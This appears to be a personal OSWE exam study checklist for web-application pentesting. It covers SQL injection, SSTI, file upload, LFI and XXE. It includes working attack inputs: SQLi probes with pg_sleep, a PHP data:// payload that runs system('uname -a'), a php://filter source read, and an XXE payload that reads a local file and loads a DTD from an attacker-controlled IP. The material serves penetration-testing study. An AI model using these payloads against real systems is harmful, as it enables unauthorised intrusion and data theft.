- Initial discovery
  - [ ] Check cookies and response headers
  - [ ] Check how each user controlled input reflect in the UI (XSS/SSTI)
  - [ ] Loose comparison in PHP (+ magic hashes)
  - [ ] Routing configuration
  - [ ] whitelist/blacklists
  - [ ] "Random" usage or MD5 SHA1 usage
  - [ ] Source of 404 and other error pages
  - [ ] Identify WSS endpoint and client code that interact with it 
  - [ ] Identify serialized values 

- Enabling Logging 
  - [ ] Enable database query logs
  - [ ] PHP display_errors = ON
  - [ ] Log4j configurations
  - [ ] PHP - var_dump
  - [ ] Get error info
    - [ ] Using param[] instead of param to get error messages
    - [ ] Send invalid JSON/XML inputs
  - [ ] Writable files: `find /var/www/html/ -type d -perm -o+w`
  - [ ] Python debugging using - PTVSD 

- Authentication related interesting functions
  - [ ] Session cookie has `httpOnly` flag set (stealing cookie over XSS)
  - [ ] Username enumeration
  - [ ] Login
  - [ ] Registration
  - [ ] Change password
  - [ ] Change email
  - [ ] Confirmation of email update
  - [ ] High authorization functions

- SQLi
  - [ ] Check binary: OR (select 1)=1 --
  - [ ] Check binary with brackets: OR (select 1)=1) --
  - [ ] USERID=1;SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)-- 
  - [ ] USERID=1; select+pg_sleep(10);--
  - [ ] USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END--
  - [ ] Escaping
    - [ ] Spaces with: /**/
    - [ ] Quotes with: Hex notation or $$example$$
    - [ ] select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
    - [ ] SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
  - [ ] Write file
    - [ ] COPY TO/COPY FROM
    - [ ] LO_IMPORT/LO_EXPORT
  - [ ] RCE
    - [ ] PG extension (DLL)
    - [ ] Java PROCEDURE - HSQLDB
      - [ ] com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename
      - [ ] java.lang.System.getProperty

- CSRF
  - [ ] Is CSRF protection present. 
  - [ ] Can XSS be used to initiate a cross origin request. 

- Interesting function
  - [ ] File upload
    - [ ] Can the base path be altered
    - [ ] ZIP slip
    - [ ] Validation bypass
      - [ ] <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files>
      - [ ] <https://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html>
      - [ ] <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
  - [ ] File download
    - [ ] Can the base path be altered
  - [ ] Setup operations and database scripts
  - [ ] Configuration structure
  - [ ] Search functions 
  - [ ] APIs
  - [ ] XML/JSON processing functions
  - [ ] Mass assignment
    - [ ] <https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md>

- SSTI
  - [ ] Check expressions like ({10*10)}
  - [ ] Inject logs `;require('util').log('CODE_EXECUTION');`
  - [ ] <https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf>

- Payloads 
  - [ ] FuzzDB <https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/os-cmd-execution/command-injection-template.txt>
  - LFI
    - [ ] `/proc/self/cmdline`
  - [] `{var} ${var} {{var}} <%var%> [% var %]`

- Exam tips
  - [ ] Search technology inside OSWE notes
  - [ ] Search technology in Payload All The Things repo 
  - [ ] .dockerenv / env / cron
  - [ ] `php://filter/read=convert.base64-encode/resource=example.php`
  - [ ] `data://text/plain,<?php echo system(“uname -a”);?>`
  - [ ] graphql
  - [ ] .Net fiddle
  - [ ] <https://github.com/blabla1337/skf-labs>
  - [ ] <https://www.tunnelsup.com/hash-analyzer/>

- Steps
  - What are the exposed functions to non-auth users
  - How admin panel / user panel check if user is logged in
  - Login/registration/forgot-password/logout functions
  
XXE
```xml
<!ENTITY wrapper "%start;%file;%end;">

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
<lastName>&wrapper;</lastName>
<firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
